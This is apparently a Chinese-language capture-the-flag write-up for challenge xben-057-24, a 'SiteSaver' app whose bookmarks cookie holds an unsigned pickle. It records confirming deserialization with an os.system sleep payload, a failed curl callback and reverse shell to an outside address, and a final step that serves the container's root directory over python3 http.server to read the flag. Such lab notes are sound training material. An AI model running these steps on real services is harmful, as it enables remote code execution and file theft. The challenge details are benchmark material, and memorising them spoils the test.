# xben-057-24 · 探索记录

对应题解：[`xben-057-24.md`](./xben-057-24.md)

## 目标与起点

`10.0.175.48:80`，SiteSaver。`/` → 302 → `/list`；首次访问下发 `user` + `bookmarks` cookie。

## 第一阶段：识别 cookie 格式

```text
bookmarks=gARdlC4=  ->  b'\x80\x04]\x94.'  ->  pickle.dumps([])
user=19428416c22e4e7591643eed18159677
```

`\x80\x04` 是 pickle 协议 4 的标志，且没有 HMAC 后缀（不是 itsdangerous 签名）。

## 第二阶段：判断是否会反序列化

| 请求 | 耗时 | 结果 |
| --- | --- | --- |
| 只带恶意 `bookmarks` | 0.13s | 200，空列表 |
| `user=<有效>` + 恶意 `bookmarks`（`os.system('sleep 3')`） | **3.1s** | 500 |
| 同 075 的同类站点做同样测试 | 0.13s | 500（不反序列化） |

判据：3 秒延迟 = `sleep` 真的执行了。500 只是「反序列化结果结构不对」。

## 第三阶段：找输出通道

| 尝试 | 结果 |
| --- | --- |
| `curl http://10.254.1.70:8899/...` | 请求挂住（容器不能回连 VPN） |
| 写 `/app/static/m57.txt`、`/var/www/html/static/m57.txt` 等 | 对应 URL 全 404（不知道真实 static 目录/权限不足） |
| **容器内起 `python3 -m http.server 8899 --directory /`** | 从 VPN 访问 `<ip>:8899/flag.txt` → **flag** |

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 只替换 `bookmarks` 不带 `user` | 不执行 | 无延迟 |
| 反弹到 VPN 地址 | 不可达 | 容器内 `Network is unreachable` |
| 写入静态目录 | 404 | 无法确定 DocumentRoot，且可能无写权限 |

## 这次真正的收获

1. **`sleep` 是判断「有没有反序列化」的最便宜手段**；不要只看状态码或回显。
2. 有些实现只在校验了另一个 cookie（这里是 `user`）之后才反序列化，
   所以测试时要带上服务器刚下发的完整 cookie 组。
3. 不出网时，用 RCE 起一个静态文件服务，比找 web 根目录更可靠。
